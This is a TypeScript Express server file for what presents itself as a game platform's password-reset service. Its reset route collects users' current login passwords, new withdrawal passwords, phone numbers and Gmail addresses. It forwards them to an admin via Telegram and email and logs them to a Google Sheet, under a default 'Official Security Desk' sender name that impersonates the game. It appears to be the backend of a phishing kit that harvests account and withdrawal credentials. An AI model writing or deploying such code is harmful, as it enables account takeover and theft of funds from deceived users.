import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dotenv from "dotenv";
import {
  sendEmailNotification,
  sendTelegramNotification,
  sendToGoogleSheet,
  checkConfigStatus,
} from "./src/server/notifications.js";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API route for health check and configuration audit
  app.get("/api/health", (_req, res) => {
    const config = checkConfigStatus();
    res.json({
      status: "ok",
      timestamp: new Date().toISOString(),
      config,
    });
  });

  // API route for testing Telegram integration
  app.get("/api/test-telegram", async (_req, res) => {
    const result = await sendTelegramNotification({
      gameName: "Test Game Platform (Server Test)",
      requestId: "TEST-" + Math.floor(100000 + Math.random() * 900000),
      usernameOrPhone: "demo_user",
      gmail: "demo@example.com",
      loginPassword: "demopassword123",
      newWithdrawPassword: "withdrawpass789",
      timestamp: new Date().toLocaleString("bn-BD"),
      companyName: process.env.COMPANY_NAME || "Test Company Desk",
    });
    return res.json(result);
  });

  // API route for submitting form & sending email + telegram
  app.post("/api/reset-password", async (req, res) => {
    try {
      const {
        gameName,
        gmail,
        usernameOrPhone,
        loginPassword,
        newWithdrawPassword,
        timestamp,
        requestId,
      } = req.body;

      if (!gameName || !usernameOrPhone || !newWithdrawPassword) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      const effectiveRequestId =
        requestId || "REQ-" + Math.floor(100000 + Math.random() * 900000);
      const effectiveTimestamp =
        timestamp ||
        new Date().toLocaleString("bn-BD", {
          dateStyle: "medium",
          timeStyle: "short",
        });

      const companyName = (
        process.env.COMPANY_NAME ||
        process.env.BUSINESS_EMAIL_FROM_NAME ||
        `${gameName} Official Security Desk`
      ).trim();

      // 1. Send confirmation message directly to USER and ADMIN via Gmail
      const emailStatus = await sendEmailNotification({
        gameName,
        requestId: effectiveRequestId,
        usernameOrPhone,
        gmail,
        loginPassword,
        newWithdrawPassword,
        timestamp: effectiveTimestamp,
        companyName,
      });

      // 2. Dispatch instant Telegram notification to Admin
      const telegramStatus = await sendTelegramNotification({
        gameName,
        requestId: effectiveRequestId,
        usernameOrPhone,
        gmail,
        loginPassword,
        newWithdrawPassword,
        timestamp: effectiveTimestamp,
        companyName,
      });

      // 3. Append Row to Google Sheet
      const googleSheetStatus = await sendToGoogleSheet({
        gameName,
        requestId: effectiveRequestId,
        usernameOrPhone,
        gmail,
        loginPassword,
        newWithdrawPassword,
        timestamp: effectiveTimestamp,
        companyName,
      });

      return res.json({
        success: true,
        requestId: effectiveRequestId,
        emailStatus,
        telegramStatus,
        googleSheetStatus,
      });
    } catch (err: any) {
      console.error("Server error:", err);
      return res.status(500).json({ error: "Internal Server Error" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*all", (_req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
